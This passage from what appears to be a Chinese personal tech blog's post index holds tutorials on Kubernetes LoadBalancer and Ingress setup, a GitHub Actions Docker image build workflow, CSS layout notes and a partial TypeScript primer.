的服务，Kubernetes 通常首先进行与请求 type: NodePort 服务等效的更改。 cloud-controller-manager 组件然后配置外部负载均衡器以将流量转发到已分配的节点端口。\u0026rdquo;\nhttps://kubernetes.io/zh-cn/docs/concepts/services-networking/service/#type-nodeport\n我们的负载均衡器先是使用一个 NodePort 端口，然后将 LB 服务从 EXTERNAL IP 来的外部流量转发到这个 NodePort ，也就是 32176 中。\n为什么需要一个 NodePort 作为 LB 的中间端口呢？如果不用这个端口，那么 LB 会直接将流量转发到 Pod 中。我觉得应该是需要节点的 NodePort 做一层负载均衡吧。\n于是，我尝试访问集群中工作节点的 32176，端口，果然，所有节点的该端口都可以访问到服务：\n它就是 NodePort。\nLB 类型服务将来自 EXTERNAL-IP:Port 的流量，通过 NodePort 负载均衡到 Pod 中。这可能也是 LoadBalancer 名字的意思？\nspec: ports: - name: http port: 9097\t# EXTERNAL-IP 的端口是这个 protocol: TCP targetPort: 9097 我进一步尝试 禁用负载均衡器节点端口分配，首先把之前的 Service 删除，修改 yaml，再 apply：\napiVersion: v1 kind: Service metadata: ,,, name: tekton-dashboard namespace: tekton-pipelines spec: # 在 spec 中加上这个字段 不再为其分配 NodePort allocateLoadBalancerNodePorts: false ports: - name: http port: 9097 protocol: TCP targetPort: 9097 type: LoadBalancer ... 果然，NodePort 没有了，也进一步验证了之前猜想：\n$ k get svc -n tekton-pipelines NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE tekton-dashboard LoadBalancer 10.111.86.40 192.168.0.201 9097/TCP 3s 小结 我们稍微讨论了关于 Loadbalancer 这一类型的服务，包括：\n本地集群/裸金属/私有云通过 MetaLB 实现 Loadbalancer； MetaLB 的部署、配置、使用； Loadbalancer 它的两个端口，以及通过 NodePort 进行负载均衡； 还有不常用的 ExternalName 类型服务。 Ingress 从官网这张图来看，Ingress 的作用就比较清晰了，通过一组路由规则，将集群外的请求负载均衡到内部服务，实现集群流量统一接入。\n我们将上文中 tekton-dashboard 服务修改为 ClusterIP，然后通过 Ingress 暴露服务，完成我们这部分的实践。\n$ k get svc -n tekton-pipelines NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE tekton-dashboard ClusterIP 10.101.20.90 \u0026lt;none\u0026gt; 9097/TCP 5s 这里使用 Ingress-Nginx 作为我们集群的 ingress。\nIngress-Nginx 安装 Ingress-Nginx Nginx 实现的 Ingress Controller 提供了 Cloud 和 Metal 版本的 manifest。主要的区别是 Cloud 版本使用 LB 暴露服务，而 Metal 使用 NodePort 暴露服务。如果你跟随上文，部署了 MetaLB 在本地集群，就推荐使用 Cloud 版本的 manifest。\n注意，原始 manifest 中包含 registry.k8s.io 的镜像，可能不方便拉取，我更换了 docker hub 中对应的镜像，主要有三处地方，共两个镜像：\ndyrnq/ingress-nginx-controller:v1.4.0 liangjw/kube-webhook-certgen:v1.1.1 $ kubectl apply -f https://ghproxy.com/https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.4.0/deploy/static/provider/cloud/deploy.yam 如果镜像无法拉取，注意修改其中的镜像仓库。\n$ k get po -n ingress-nginx NAME READY STATUS RESTARTS AGE ingress-nginx-admission-create-ptg6f 0/1 Completed 0 19m ingress-nginx-admission-patch-lndpj 0/1 Completed 0 19m ingress-nginx-controller-8445cd49cf-l4q4r 1/1 Running 0 19m $ k get svc -n ingress-nginx NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE ingress-nginx-controller LoadBalancer 10.106.83.156 192.168.0.201 80:31527/TCP,443:32376/TCP 20m ingress-nginx-controller-admission ClusterIP 10.97.1.125 \u0026lt;none\u0026gt; 443/TCP 20m 部署完成后，看到 LB 分配的 IP 是 192.168.0.201。接下来我们配置 ingress，从 192.168.0.201:80 端口访问我们想要的服务。\n配置 Ingress 暴露 Tekton Dashboard 服务 首先确保我们的 Tekton Dashboard 服务以及创建。\n$ k get svc -n tekton-pipelines NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE tekton-dashboard ClusterIP 10.101.20.90 \u0026lt;none\u0026gt; 9097/TCP 5s 一个 Ingress 的配置文件如下：\napiVersion: networking.k8s.io/v1 kind: Ingress metadata: name: ingress-resource namespace: tekton-pipelines annotations: kubernetes.io/ingress.class: nginx nginx.ingress.kubernetes.io/ssl-redirect: \u0026#34;false\u0026#34; spec: rules: # 我们为其设置了域名 但是公网 DNS 可不会解析它 # 需要在我们本地配置 host 来正确解析 - host: tekton.k8s.local http: paths: - path: / pathType: Prefix backend: service: name: tekton-dashboard port: number: 9097 部署：\n$ k apply -f dashboard-ingress.yaml 部署完成之后，我们需要在本地配置域名解析，让 tekton.k8s.local 能够解析到 192.168.0.201 。\n然后通过浏览器访问 http://tekton.k8s.local/。在浏览器中默认解析到 192.168.0.201:80 的根 / 路由路径下。\n这样就实现了通过 ingress 暴露集群内部服务。\n关于配置 host 我们在 ingress 的配置中指定了 host 字段，并配置了本地域名解析去访问这个域名：\nspec: rules: - host: tekton.k8s.local ... 虽然我们知道 ingress 暴露的 IP 是 192.168.0.201:80 ，但是直接访问这个地址并不能找到服务：\n如果我们先通过 IP:Port 的形式，而不通过域名，就不能在 spec.rules 中为其配置 host，也就是使用这种配置：\nhttps://kubernetes.io/zh-cn/docs/concepts/services-networking/ingress/#ingress-rules\n\u0026ldquo;未指定 host 的规则适用于通过指定 IP 地址的所有入站 HTTP 通信\u0026rdquo;。\napiVersion: networking.k8s.io/v1 kind: Ingress ... spec: rules: # 不指定 host #- host: tekton.k8s.local - http: paths: - path: / pathType: Prefix backend: service: name: tekton-dashboard port: number: 9097 这样进行部署，就可以直接通过 ingress 控制器的 LB 地址和端口 (默认 http 为 80)，从其根路径下访问到我们的服务了。\n小结 本部分我们简单介绍和实践了 Ingress，主要有以下内容：\n简要阐述 cloud 和 metal 环境下，ingress-nginx 控制器 service 类型的不同；\n安装 LoadBalancer 类型的 ingress-nginx 控制器；\n为 ClusterIP 类型的 Tekton Dashboard 服务配置 ingress 规则；\n关于配置 ingress 中 host，使用 域名/IP 访问的小坑。\n","date":"2023-01-26T17:51:33+08:00","image":"https://picgo-lzl.oss-cn-beijing.aliyuncs.com/image-20230126181500003.png","permalink":"https://lizonglingo.github.io/p/loadbalancer%E4%B8%8Eingress/","title":"Loadbalancer与Ingress"},{"content":"CI-自动构建镜像 CI/CD 已经成为目前开发工作中必须掌握的技能。利用 CI/CD 工具能够大幅提高软件发布和交付速度，同时自动化流程能最大限度减少人工过多参与导致的不确定性。\n本文从 CI 工作流中的镜像自动化构建开始，探索 CI/CD 如何实现 DevOps 理念。通过使用 Github Action 和 Docker Hub 实现镜像自动化构建和发布，开启 CI/CD 学习之路。\n关于 DevOps、GitOps、CI/CD 的理解：\n从我目前的认知和了解，我理解的 DevOps 更多的是较为概括性、统筹的一种理念，或者说是一种思想。而 CI/CD 工具则是对这种思想的具体实现。当然，GitOps 可以把它理解成在 DevOps 理念中，以 Git 作为主线、主要工具，围绕 Git 打造一套 CI/CD 工作流，实际上也是 DevOps 的一种实现形式、或是这种理念 “更具体” 的表述形式。\n由于目前还没有接触到一线的生产工作，对此的理解会有欠缺。希望在以后工作中能对自动化软件交付有更深入的理解。\nGithub Actions 我们可以在这个文档中学习详细的信息：https://docs.github.com/zh/actions\nhttps://docs.github.com/zh/actions/publishing-packages/publishing-docker-images\n\u0026ldquo;在 GitHub Actions 的仓库中自动化、自定义和执行软件开发工作流程。 您可以发现、创建和共享操作以执行您喜欢的任何作业（包括 CI/CD），并将操作合并到完全自定义的工作流程中。\u0026rdquo;\n在使用 Github Page 托管 Hugo 时，就涉及到使用 Github Actions 自动化发布静态网站的步骤。Github Action 是 GitOps 中重要一环。\n\u0026ldquo;GitHub Actions 工作流，使其在存储库中发生事件（例如打开拉取请求或创建问题）时触发 。 工作流包含一个或多个可按顺序或并行运行的作业。 每个作业都将在其自己的虚拟机运行器中或在容器中运行，并具有一个或多个步骤，用于运行定义的脚本或运行动作。\u0026rdquo;\nGithub Actions 工作流主要包含以下几个概念：\nEvent：这是触发工作流特定活动。例如创建拉取请求、提交推送等。 Runner：运行 Job，执行工作流的服务器，每个 Runner 一次可以运行一个作业。这些 Runner 是在云上的虚拟机。 Job：工作流中在同一机器上执行的一组 Step，这些 Step 按照顺序执行，相互依赖。 Step：组成 Job 的执行单元，可以是脚本、命令等操作。 Workflow示例 Github Actions 的 workflow 放在项目根文件夹 (.git所在的目录) 中的 .github/workflows/ 里面。通过 yaml 文件定义。我们先创建一个 build.yaml 来实现提交代码触发镜像自动构建和上传镜像仓库操作。\n$ ll total 28 drwxrwxr-x 5 lzl lzl 4096 1月 25 23:34 ./ drwxrwxrwx 19 root root 4096 1月 21 21:44 ../ drwxrwxr-x 8 lzl lzl 4096 1月 8 17:30 .git/ -rw-rw-r-- 1 lzl lzl 66 1月 3 22:17 .gitattributes -rw-rw-r-- 1 lzl lzl 43 1月 8 17:30 .gitignore drwxr-xr-x 7 root root 4096 1月 8 12:06 k8s-practice/ root@nm:/work-place/GitOps# mkdir -p .github/workflows root@nm:/work-place/GitOps# vim .github/workflows/build.yaml build.yaml文件如下：\n# name 表示工作流名称 会展示在 Github 网页上 name: build # on.push.branches 表示 main 有新的提交后 触发工作流 on: push: branches: - \u0026#39;main\u0026#39; # 通过 env 我们可以为本次 action 设置环境变量 用在后续各个 steps 中 # 这里我们设置 DOCKERHUB_USERNAME 用于镜像前缀 # Docker Hub 要求个人镜像仓库中的镜像有 username 这个前缀 env: DOCKERHUB_USERNAME: username # jobs 定义任务 jobs: docker: # 设置这个任务的运行环境 runs-on: ubuntu-latest # steps 是一个列表 定义了每一个步骤 steps: - name: Checkout\t# Checkout 将代码检出到运行环境 uses: actions/checkout@v3 - name: Set outputs\t# 用来生成本次的短 sha 哈希 用于后面的镜像 tag id: vars run: echo \u0026#34;::set-output name=sha_short::$(git rev-parse --short HEAD)\u0026#34; # 初始化 Docker 构建工具链 - name: Set up QEMU uses: docker/setup-qemu-action@v2 - name: Set up Docker Buildx uses: docker/setup-buildx-action@v2 # 登录到 Docker Hub - name: Login to Docker Hub uses: docker/login-action@v2 with:\t# 通过 with 字段向插件提供参数 # env 使用我们上述定义的 env username: ${{ env.DOCKERHUB_USERNAME }} # secrets 则是存储在 Github 仓库中的 secrets 稍后会进行配置说明 password: ${{ secrets.DOCKERHUB_TOKEN }} - name: Build backend and push uses: docker/build-push-action@v3 with: # context 定义构建镜像所需目录上下文 不一定是 Dockerfile 的目录 context: ./k8s-practice/demo-app/kubernetes-example/backend push: true tags: ${{ env.DOCKERHUB_USERNAME }}/backend:${{ steps.vars.outputs.sha_short }} - name: Build frontend and push uses: docker/build-push-action@v3 with: context: ./k8s-practice/demo-app/kubernetes-example/frontend push: true tags: ${{ env.DOCKERHUB_USERNAME }}/frontend:${{ steps.vars.outputs.sha_short }} 不难发现，每一个 Step 都会依赖插件，也就是 uses 字段。Github Actions 插件市场 为我们提供了生产所需的各种插件，每个插件都有对应的文档。\nSecret Docker Hub Secret 由于我们的私有仓库需要身份认证才能获得上传镜像等准入权限，因此需要告知 Github Actions 我们 Docker Hub 的凭证。我们需要创建一个 Access Token。\nActions secrets 然后，将 Docker Hub 的 Access Token 填到 Github 仓库中的 Actions secrets 中。注意 Name 应该和 workflow 文件中的对应，即：DOCKERHUB_TOKEN。\n# secrets 则是存储在 Github 仓库中的 secrets 稍后会进行配置说明 password: ${{ secrets.DOCKERHUB_TOKEN }} 提交代码触发工作流 最后，将我们的代码改动提交main分支，我们能在仓库的 Actions 中看到工作流。\n同时，能够查看每一个 Step 的详细过程，以便定位排查问题。\n在工作流成功执行完成后，在 Docker Hub 的仓库中也看到了对应的新镜像。\n","date":"2023-01-25T22:59:33+08:00","image":"https://picgo-lzl.oss-cn-beijing.aliyuncs.com/20230126175426.png","permalink":"https://lizonglingo.github.io/p/ci/cd-%E8%87%AA%E5%8A%A8%E6%9E%84%E5%BB%BA%E9%95%9C%E5%83%8F/","title":"CI/CD-自动构建镜像"},{"content":"CSS 使用要点 作为后端程序员，在 CSS 上应付前端需求我认为最重要是盒模型、flex 布局、选择器这几个点。其他的样式、组件啥的，都有现成的库。\n同时，在调试样式时，不妨直接在浏览器中修改，达到效果再粘贴回文件，省时省力。\n字体 font-size：大小 font-family：字体 font-style：斜体等字体风格 font-weight：设置字体粗细 white-space：折行 word-break：截断 text-overflow：溢出 选择器 标签选择器 nav { padding: 30px; } 直接通过标签名进行选择。\nid 选择器 通过 #id 进行选择，例如：\n#app { font-family: Avenir, Helvetica, Arial, sans-serif; -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-align: center; color: #2c3e50; } 类选择器 通过 .class 进行选择，例如：\n.el-list-leave-active { position: absolute !important } 选择器的组合 同时满足没有空格，父子关系含有空格。\n同时满足不同选择条件 元素有多个 class，如 class=\u0026quot;class1 class2\u0026quot;，选择多个 class 都满足的元素：.class1.class2 标签下的类，如 \u0026lt;div class=\u0026quot;class\u0026quot;\u0026gt;，使用 div.class 标签下的id，如 \u0026lt;div id=\u0026quot;id\u0026quot;\u0026gt;，使用 div#id 同时符合id和类，如 \u0026lt;div id=\u0026quot;id\u0026quot; class=\u0026quot;class\u0026quot;\u0026gt;，使用 #id.class \u0026hellip; 此外，需要根据实际情况使用。\n父子关系的选择器 使用空格标识选择子元素。\n某个类下面的标签：.class div，表示 class 类下面的 div 元素 某个类下面的某个类：.class1 .class2，表示 class1 类下面的 class2 同组合选择器一样，使用时灵活组合。\n如果多层嵌套的元素，多层父子关系，还可以选择指定的第几级子元素。\n控制元素大小 https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_Box_Model/Introduction_to_the_CSS_box_model\n相关属性如下：\nwidth height right left bottom top margin padding border 单位：\n绝对单位：px 百分比 控制元素的位置 ⚠️需要注意，这些属性应该放在父元素还是子元素中。\nposition 属性 position熟悉用来控制元素的位置，例如：相对位置、绝对位置等。\n具体示例见：https://developer.mozilla.org/zh-CN/docs/Web/CSS/position\nstatic：元素使用正常的布局行为，即元素在文档常规流中当前的布局位置。此时 top, right, bottom, left 和 z-index 属性无效。\nrelative：元素相对于正常布局行为的偏移。\n元素先放置在未添加定位时的位置，再在不改变页面布局的前提下调整元素位置(例如使用 top, right, bottom, left 等)（因此会在此元素未添加定位时所在位置留下空白）、\n⭐为父元素定义 relative ，可以使子元素通过 absolute 相对于父元素进行绝对位置的摆放。\nabsolute：简单理解为元素相对于整个页面（有时不是相对于整个页面）的偏移。\n元素会被移出正常文档流，并不为元素预留空间，通过指定元素相对于最近的非 static定位祖先元素的偏移，来确定元素位置。绝对定位的元素可以设置外边距（margins），且不会与其他边距合并。\nfixed：元素飘在页面上，不会跟着滚动条走。\n元素会被移出正常文档流，并不为元素预留空间，而是通过指定元素相对于屏幕视口（viewport）的位置来指定元素位置。元素的位置在屏幕滚动时不会改变。打印时，元素会出现在的每页的固定位置。fixed 属性会创建新的层叠上下文。当元素祖先的 transform、perspective、filter 或 backdrop-filter 属性非 none 时，容器由视口改为该祖先。\nsticky：随着页面的滚动，元素始终保持它在正常布局时的位置。\n元素根据正常文档流进行定位，然后相对它的最近滚动祖先（nearest scrolling ancestor）和 containing block（最近块级祖先 nearest block-level ancestor），包括 table-related 元素，基于 top、right、bottom 和 left 的值进行偏移。偏移值不会影响任何其他元素的位置。\ntext-align 属性 https://developer.mozilla.org/zh-CN/docs/Web/CSS/text-align\ntext-align CSS 属性定义行内内容（例如文字）如何相对它的块父元素对齐。text-align 并不控制块元素自己的对齐，只控制它的行内内容的对齐。\nstart ：如果内容方向是左至右，则等于left，反之则为right。\nend ：如果内容方向是左至右，则等于right，反之则为left。\nleft：行内内容向左侧边对齐。\nright：行内内容向右侧边对齐。\ncenter：行内内容居中。\n\u0026lt;string\u0026gt; ：第一个出现的该（单字符）字符串被用来对齐。跟随的关键字定义对齐的方向。例如，可用于让数字值根据小数点对齐。\njustify：文字向两侧对齐，对最后一行无效。\njustify-all：和 justify 一致，但是强制使最后一行两端对齐。\nmatch-parent：和inherit类似，区别在于start和end的值根据父元素的direction确定，并被替换为恰当的left或right。\ndisplay 属性 https://developer.mozilla.org/zh-CN/docs/Web/CSS/display\ndisplay 属性设置元素是否被视为块或者内联元素以及用于子元素的布局，例如流式布局、网格布局或弹性布局。\nblock：该元素生成一个块级元素盒，在正常的流中，该元素之前和之后产生换行。\ninline：该元素生成一个或多个内联元素盒，它们之前或者之后并不会产生换行。在正常的流中，如果有空间，下一个元素将会在同一行上。\ninline-block：该元素生成块级元素盒，如果它是一个单独的内联盒，它将盒周围的内容一起流动（行为类似于替换元素）。\nflex：该元素的行为类似块级元素并且根据弹性盒模型布局它的内容。⭐这种排布方式是用的比较多的，因此作为重点。\nflex-direction https://developer.mozilla.org/zh-CN/docs/Web/CSS/flex-direction\nflex-direction 属性指定了内部元素是如何在 flex 容器中布局的，定义了主轴的方向 (正方向或反方向)。\nrow：flex 容器的主轴被定义为与文本方向相同。主轴起点和主轴终点与内容方向相同。\nrow-reverse：表现和 row 相同，但是置换了主轴起点和主轴终点\ncolumn：flex 容器的主轴和块轴相同。主轴起点与主轴终点和书写模式的前后点相同\ncolumn-reverse：表现和column相同，但是置换了主轴起点和主轴终点\nalign-items https://developer.mozilla.org/zh-CN/docs/Web/CSS/align-items\nalign-items 属性将所有直接子节点上的 align-self 值设置为一个组。align-self 属性设置项目在其包含块中在交叉轴方向上的对齐方式。\n大白话讲，这个属性用来控制子元素节点垂直与轴方向的元素排布。\nalign-self https://developer.mozilla.org/zh-CN/docs/Web/CSS/align-self\n这个属性用来控制本元素节点垂直与轴方向的元素排布。例如：在父元素中横向充满。\njustify-content https://developer.mozilla.org/zh-CN/docs/Web/CSS/justify-content\njustify-content 属性定义了浏览器之间，如何分配顺着弹性容器主轴 (或者网格行轴) 的元素之间及其周围的空间。\n","date":"2023-01-18T18:18:33+08:00","image":"https://lizonglingo.github.io/post-images/20230118234450.png","permalink":"https://lizonglingo.github.io/p/css%E4%BD%BF%E7%94%A8%E8%A6%81%E7%82%B9/","title":"CSS使用要点"},{"content":"前言 作为后端开发者，很多时候会面对前端开发的需求。就我最常用的 Golang 而言，它的 template 能够快速且简洁的开发一些简单的前端页面。\n但是也有很多时候，我们可能想去实现比较复杂一些的前端页面，更好的展示后端功能。因为对于一些软件的使用者，他们并不会像我们一样，使用 CLI 、API 等接口去使用。一个精美的、一目了然的网页更能给他们使用下去的欲望。\n再或者，谁不想向“全栈工程师”更近一步呢？在 CNCF landscape 蓬勃发展的时代，几乎每个项目都会有自己的站点、有 Dashboard。尤其是一些可观测性方面的项目。前端技术让晦涩难懂的代码华丽的展示在人们面前，有时候，仅仅是因为前端做的好看就能够收获一大批用户。在这个人人好像都有全栈开发能力的时代，只会写一些后端代码总感觉差点意思。\n同时，博客框架、站点框架等前端框架，使得我们可以通过改改配置文件、修改几行代码就能将自己的内容以网站的形式展现，这是极为方便的。但无论如何，我们都避免不了去定制化的开发前端内容。\nVue和React可谓知名度最大的前端框架之二，其开源生态带来的丰富的教程、多样的组件，很大程度上减少了的前端开发的复杂性。对于很少接触前端以及缺少相关理论知识的开发者来说，上手这两个框架还是需要一定的基础。\n我决定在这个寒假正式把前端能力的提升加入日程，目标是在有前端需求时，能够快速的通过 Vue/React 脚手架和开源组件，将前后端分离的技术用于自己的开发中，快速为后端应用搭建一个看的过去的前端页面。\n为什么是 Typescript 我常常觉得 Js 代码混乱，没有结构性，不够简洁和优美。可能是因为 Go 写的太多的原因，很少有主流语言像 Go 有这么少的特性、关键字、语法糖了吧，它是静态语言的特点能把尽可能多的问题及时暴露在开发阶段。Typescript 的很大程度上减少了 Javascript 在开发中的不确定性，这种优势能够提高 Debug 的效率和程序运行的确定性。同时，从我的角度，前端开发正在慢慢拥抱 Typescript，它为前端工程带来的优点是有目共睹的。Vue/React 都支持Typescript，相对于 Javascript 来说，可能后端程序员直接以 Typescript 作为自己的第一门 “前端语言” 是不是更好些呢？（我没怎么使用过 Javascript，不敢妄下断论。）\n所以，我决定以 CSS布局➡️TS➡️Vue||React 的线路，比较系统把前端开发能力补齐。这个过程肯定有很多东西“不求甚解”，但我想，只要我能够用起来，在前端能够实现自己的想法就够了。\n通过本文，希望可以快速覆盖常用的 TS 知识点，快速上手，为使用框架做铺垫。\n基本数据类型 需要理解 Typescript 对于 Javascript 的能力、安全性、可预测性、规范性的能力，绝大部分来自编译器给我们的限制。事实上在底层，Typescript 也是翻译成 Javascript 来运行的。其中一些特性，我们需要带入编译器的角度，即：在翻译成 Javascript 做了什么，便会好理解一些。\nnumber：可以是整数，可以是浮点数 boolean string const 和 let const：定义的值不可变，对于不变的值，我们尽量多用 const 保证变量不被滥用！ let：定义的值可变 定义时可以不告知变量，编译器自己推到： const a: string =\u0026#39;123\u0026#39; // const a =\u0026#39;123\u0026#39; ok let b: string = \u0026#39;23\u0026#39; // let b = \u0026#39;23\u0026#39; ok literal 数据类型 let ans: \u0026#39;yes\u0026#39; | \u0026#39;no\u0026#39; | \u0026#39;maybe\u0026#39; = \u0026#39;yes\u0026#39; let httpStatus: 200 | 404 | 500 = 200 let httpStatusStr: 200 | 404 | \u0026#39;500\u0026#39; | \u0026#39;502\u0026#39; = \u0026#39;502\u0026#39; 给这个变量限定特定的取值。有点类似枚举。\nliteral的值可以赋给其他变量，但是类型必须相同。\nlet s = ans\t// let s: \u0026#34;yes\u0026#34; 这样 let 类型 // 或者 let s:string = ans\t// ok let s:string = httpStatusStr // ok httpStatusStr 类型是字符串 // let s:number = httpStatusStr 就不行 因为 httpStatusStr 是字符串 s = \u0026#39;abcd\u0026#39; // 但是 ans = s 就不行 那let httpStatusStr: 200 | 404 | '500' | '502' = '502'这种类型怎么理解？\nUnion of Types let httpStatusStr: 200 | 404 | \u0026#39;500\u0026#39; | \u0026#39;502\u0026#39; = \u0026#39;502\u0026#39; function f(s: 200 | \u0026#39;502\u0026#39;) { let status: string | number = s // let status: string = s 错误 // let status: number = s 错误 } 顾名思义，类型的并集。\nany 通过any类型，让编译器不进行语法检查。\nlet a:any = \u0026#39;abc\u0026#39; a = 123 // ok a = {} a.name = \u0026#39;jack\u0026#39; undefined 一旦定义为undefined，值就只能是undefined。\nlet c:undefined = undefined 一般，用在这种情况，实现可选参数：\nlet httpStatusStr: 200 | 404 | \u0026#39;500\u0026#39; | \u0026#39;502\u0026#39; | undefined = undefined function f(s: 200 | 404 | \u0026#39;500\u0026#39; | \u0026#39;502\u0026#39; | undefined) { } 枚举 枚举是 Typescript 特有的类型，JS 没有。 enum HTTPStatus { OK, NOT_FOUND, INTERNAL_SERVER_ERROR, } function processeHTTPStatus(s: HTTPStatus) { console.log(s) } processeHTTPStatus(HTTPStatus.NOT_FOUND) // [LOG]: 1 支持定义枚举变量 enum HTTPStatus { OK = 200, NOT_FOUND = 404, INTERNAL_SERVER_ERROR = 500, } 支持和 union of types 混用 enum TimingFunc { LINEAR = \u0026#39;linear\u0026#39;, EASE = \u0026#39;ease\u0026#39;, EASE_IN = \u0026#39;ease-in\u0026#39;, } function tf(timingFunc: | \u0026#39;linear\u0026#39; | \u0026#39;ease\u0026#39; | \u0026#39;ease-in\u0026#39;) { console.log(timingFunc) } tf(TimingFunc.EASE) // \u0026#34;ease\u0026#34; 从类型值推导回类型，类似 map 结构通过 key 寻找 value function tfBack(timingFunc: HTTPStatus) { console.log(HTTPStatus[timingFunc]) } tfBack(HTTPStatus.INTERNAL_SERVER_ERROR) // \u0026#34;INTERNAL_SERVER_ERROR\u0026#34; 数组类型 使用 const 定义的数组元素是可以修改的 let nums = [1,2,3] // or let nums: number[] = [1,2,3] // 或者使用泛型 let nums: Array\u0026lt;number\u0026gt; = [1,2,3] 数组也支持多种类型 let nums = [1,2,3,\u0026#39;a\u0026#39;] // let nums: (string | number)[] 其他基本操作：遍历，长度，从头/尾增加删除，切片 判断数组是否为空要使用长度来判断 // 遍历 // 长度 nums.length // 从最右侧追加 类似队列 nums.push(6) // 去除最右边的值 nums.pop() // 从最左侧增加元素 nums.unshift(7) // 相应的 拿掉最左边的元素 nums.shift() // 切片 像 golang 一样前开后闭 const num = [0,1,2,3,4,5,6,7] num.slice(2,5)\t// [2,3,4] anum.slice(2)\t// [2, 3, 4, 5, 6, 7] // 删除元素 返回删除的内容 delete = num.splice(3,2)\t// 从下标 3 开始删除 2 个元素 // 从下标 3 开始删除 2 个元素 然后在对应位置填充 9,8,7 delete = num.splice(3,2,9,8,7) // 查找元素下标 idx = nums.indexOf(2)\t// 元素值所对应的下标 idx = nums.indexOf(2，5)\t// 元素值 2 所对应的下标 从下标 5 开始寻找 idx = nums.lastIndexOf(2)\t// 从后向前找 数组排序的 sort() 函数默认使用 ASCII 码顺序排列，具体在后文 函数式编程 部分中说明。 同时，forEach 遍历数组也在后文章节 函数的参数可以是函数 元组 虽然 Typescript 没有原生的元组语法，但是可以利用数组实现 const a = [1,2,3] const [a1,a2,a3] = a console.log(a1,a2,a3)\t// 1, 2, 3 对象 快速创建一个对象 const emp1 = { name: { first: \u0026#39;li\u0026#39;, last: \u0026#39;duo\u0026#39;, }, gender: \u0026#39;male\u0026#39; as \u0026#39;male\u0026#39; | \u0026#39;female\u0026#39; | \u0026#39;other\u0026#39;, salary: 9000, bonus: undefined as (number | undefined), badges: [\u0026#39;a\u0026#39;, \u0026#39;b\u0026#39;], } emp1.bonus = 100000 emp1.gender = \u0026#39;other\u0026#39; console.log(emp1) // { // \u0026#34;name\u0026#34;: { // \u0026#34;first\u0026#34;: \u0026#34;li\u0026#34;, // \u0026#34;last\u0026#34;: \u0026#34;duo\u0026#34; // }, // \u0026#34;gender\u0026#34;: \u0026#34;other\u0026#34;, // \u0026#34;salary\u0026#34;: 9000, // \u0026#34;bonus\u0026#34;: 100000, // \u0026#34;badges\u0026#34;: [ // \u0026#34;a\u0026#34;, // \u0026#34;b\u0026#34; // ] // } 对象转 json 字符串 以及 json 字符串转对象 const s: string = JSON.stringify(emp1) console.log(s) // \u0026#34;{\u0026#34;name\u0026#34;:{\u0026#34;first\u0026#34;:\u0026#34;li\u0026#34;,\u0026#34;last\u0026#34;:\u0026#34;duo\u0026#34;},\u0026#34;gender\u0026#34;:\u0026#34;other\u0026#34;,\u0026#34;salary\u0026#34;:9000,\u0026#34;bonus\u0026#34;:100000,\u0026#34;badges\u0026#34;:[\u0026#34;a\u0026#34;,\u0026#34;b\u0026#34;]}\u0026#34; // 再由 json 字符串转回对象 // 但是 这种字符串转换的对象 编译器并不能知道它具体是什么类型 会认为 emp2: any const emp2 = JSON.parse(s) 逻辑控制 if/else 判断相等，一定用=== 判断不相等，一定用!== 如果遇到类型组合的参数，就不用担心有意外情况，因为对于类型组合参数来说，非法数值根本无法当作参数，如下面的例子： function processeHttpStatus(s:200 | 404 | \u0026#39;500\u0026#39; | \u0026#39;502\u0026#39;){ if (s===200) { console.log(\u0026#39;ok\u0026#39;) } else if (s===\u0026#39;500\u0026#39;) { console.log(\u0026#39;500\u0026#39;) } // 不需要 除了 200 | 404 | \u0026#39;500\u0026#39; | \u0026#39;502\u0026#39; 以外的值传不进来 // else { // console.log(\u0026#39;unknown\u0026#39;) // } } processeHttpStatus(200)\t// \u0026#34;ok\u0026#34; switch 注意，不像 go，需要在每个分支中加 break。 function processeHttpStatus(s:200 | 404 | \u0026#39;500\u0026#39; | \u0026#39;502\u0026#39; | undefined){ const status = typeof s === \u0026#39;string\u0026#39; ? parseInt(s) : s switch (status) { case 200: console.log(\u0026#39;ok\u0026#39;) break case 502: console.log(\u0026#39;502\u0026#39;) break default: console.log(\u0026#39;unknown\u0026#39;) break } } for 和 while let sum = 0 for (let i = 0; i \u0026lt; 100; i++) { sum += i } let i = 1 while (i \u0026lt;= 100) { sum += i i++ } try/catch 保护程序在运行中出现错误时还能继续运行下去。 let sum = 0 for (let i = 0; i \u0026lt; 100; i++) { try { sum += i if (i % 17 === 0) { throw `bad number ${i}` } } catch (err) { console.error(err) } } console.log(sum) // [ERR]: \u0026#34;bad number 0\u0026#34; // [ERR]: \u0026#34;bad number 17\u0026#34; // [ERR]: \u0026#34;bad number 34\u0026#34; // [ERR]: \u0026#34;bad number 51\u0026#34; // [ERR]: \u0026#34;bad number 68\u0026#34; // [ERR]: \u0026#34;bad number 85\u0026#34; // [LOG]: 4950 函数 函数定义 注意可选参数的使用，可选参数传入就是 undefined 注意默认值的使用 注意可变参数列表的使用 function add( a: number, b: number, c?: number, d: number=0, ...e: number[]): number { let sum = a + b + (c||0) + d for (let i=0; i\u0026lt; e.length; i++) { sum += e[i] } return sum } const nums = [1,2,3,4] add(1,2,3,4,...nums) // add(1,2,3,4,1,2,3,4) 也行 不能直接传 nums 需要加 ... 对象类型做参数：使用对象类型做参数使得参数易于理解 function send(params: { url: string, method: \u0026#39;GET\u0026#39; | \u0026#39;POST\u0026#39; | \u0026#39;PUT\u0026#39;, header: object, data?: string, ack: number[] }): boolean { return true } send({ url: \u0026#39;mockurl\u0026#39;, method: \u0026#39;GET\u0026#39;, header: { contentType: \u0026#34;\u0026#34;, }, ack: [101, 102], }) 为对象定义方法 和在对象外定义的不同，在于不需要写 function 关键字，其他的 参数列表、返回值 的定义都相同。 注意，使用对象的类型需要使用 this. 来告诉编译器使用这个对象中的变量。 const emp1 = { name: { first: \u0026#39;li\u0026#39;, last: \u0026#39;duo\u0026#39;, }, gender: \u0026#39;male\u0026#39; as \u0026#39;male\u0026#39; | \u0026#39;female\u0026#39; | \u0026#39;other\u0026#39;, salary: 9000, bonus: undefined as (number | undefined), badges: [\u0026#39;a\u0026#39;, \u0026#39;b\u0026#39;], upDateSalary(a: number): void { this.salary += a }, } emp1.upDateSalary(2000) console.log(emp1.salary) // 11000 函数式编程风格 Typescript 中，函数是“一等公民” 与 